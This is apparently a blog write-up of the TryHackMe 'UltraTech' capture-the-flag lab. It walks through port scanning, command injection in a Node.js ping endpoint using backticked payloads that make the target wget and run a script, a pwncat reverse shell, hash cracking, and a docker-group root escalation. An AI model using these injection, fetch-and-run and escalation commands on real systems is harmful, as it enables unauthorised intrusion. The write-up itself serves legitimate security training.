---
layout: post
title: UltraTech Writeup
date: 2020-08-20 11:00:00 +5:30
categories: [TryHackMe, Medium]
image: /assets/img/ultratech/header.png
tags: [tryhackme, docker, Enumeration, web] # add tag
---

## Description:

The Following Post is writeup of UltraTech room of tryhackme <https://tryhackme.com/room/ultratech1>

|Machine|Details
|:---|:--
|OS | Linux
|Rating | Medium
|Creator | lp1

## Summary:

  The room have only 4 ports open 21,22,8081,31331 we can see webpage in 31331 and login api in 8081.
  Webpage have few hidden pages and a code api.js we can get reverse shell using ping command which js executes.
  After shell we got the open database and after cracking hashes we will get user.
  The user have docker permissions so GTFObins and root.

## Walkthrough:

### Enumeration

As usual
Lets start with nmap scan
```terminal
┌─[silver@parrot]─[~/Desktop/tryhackme/ultratech]
└──╼ $nmap -sC -sV 10.10.70.180
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-14 03:48 EDT
Nmap scan report for 10.10.70.180
Host is up (0.37s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
I missed something it looks like so went back to enum with masscan

```terminal
└──╼ $sudo masscan -i tun0 -p 0-65535 10.10.107.93

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-08-20 06:24:53 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65536 ports/host]
Discovered open port 31331/tcp on 10.10.107.93                                 
Discovered open port 8081/tcp on 10.10.107.93                                  
Discovered open port 21/tcp on 10.10.107.93                                    
Discovered open port 22/tcp on 10.10.107.93
```

#### Webpage

Ah gotcha port 31331 have web page.<br />
![Webpage](/assets/img/ultratech/webpage.png)<br />
Let's enum a bit

Got robots.txt
```yaml
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```
Sitemap.txt
```yaml
/
/index.html
/what.html
/partners.html
```

We can see login portal in partners.html on trying auth it redirect  us to 8081 page with /auth.
let's check how this api is handled.

![JS](/assets/img/ultratech/js.png)

we can see api.js let's check.

![api.js](/assets/img/ultratech/apijs.png)

### Exploitation:

Now we know the js first check by pinging the host.
This is potential command injection we just have to replace the ping with a command.

![whoami](/assets/img/ultratech/pingwhoami.png)

Ah we can see it got executed.

let's get a reverse shell using

made a file and wget it to the machine and execute it
```terminal
curl http://10.10.190.208:8081/ping?ip=`wget ip/cmd.sh`  
curl http://10.10.190.208:8081/ping?ip=`bash%20./cmd.sh`
```
```terminal
└──╼ $pwncat --listen --port 4444
bound to 0.0.0.0:4444 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[11:00:54] received connection from 10.10.190.208:58502                                                                 connect.py:149
[11:00:57] new host w/ hash f3ffe57d520772919cc2b2bb75c3c44c                                                             victim.py:328
[11:01:14] pwncat running in /bin/sh                                                                                     victim.py:362
initializing: complete ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0%
[11:01:21] pwncat is ready 🐈                                                                                            victim.py:758


\[\033[01;31m\](remote)\[\033[00m\] \[\033[01;33m\]\u@\h\[\033[00m\]:\[\033[01;36m\]\w\[\033[00m\]$

```
Alright got shell as www user and we can see the db file.
![DB](/assets/img/ultratech/techdb.png)

Got the hashes, move to cracking.
![Cracking](/assets/img/ultratech/hashcracked.png)

Yessss got r00t user let's see what we can do with it.

```terminal
r00t@ultratech-prod:/tmp$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)

so we can see docker privesc time

r00t@ultratech-prod:/tmp$ docker run -v /:/mnt --rm -it bash chroot /mnt sh      
```

rooted Ultratech :)
